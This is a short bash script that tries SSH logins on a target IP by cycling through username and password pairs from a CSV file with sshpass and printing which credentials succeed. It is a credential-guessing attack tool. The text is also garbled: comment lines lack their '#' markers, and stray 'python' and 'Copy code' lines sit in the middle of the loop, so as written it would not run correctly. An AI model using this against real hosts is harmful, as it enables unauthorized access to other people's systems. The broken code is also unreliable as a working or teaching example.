#!/bin/bash
Ver 1.0

Usage: bash ssh-script.sh <IP address> <CSV file>
Define the IP address and CSV file
IP_ADDRESS=$1
CSV_FILE=$2

Read the CSV file line by line and attempt to SSH using the provided credentials
while IFS=',' read -r USERNAME PASSWORD
do

Attempt to SSH using the provided credentials
sshpass -p "$PASSWORD" ssh "$USERNAME@$IP_ADDRESS" &> /dev/null

Check if the SSH connection was successful
if [ $? -eq 0 ]; then
# Log the successful SSH connection
echo "Successful SSH connection: $USERNAME $PASSWORD"

python
Copy code
# Exit the loop
break
else
# Log the unsuccessful SSH connection attempt
echo "Unsuccessful SSH connection attempt: $USERNAME $PASSWORD"
fi
done < "$CSV_FILE"
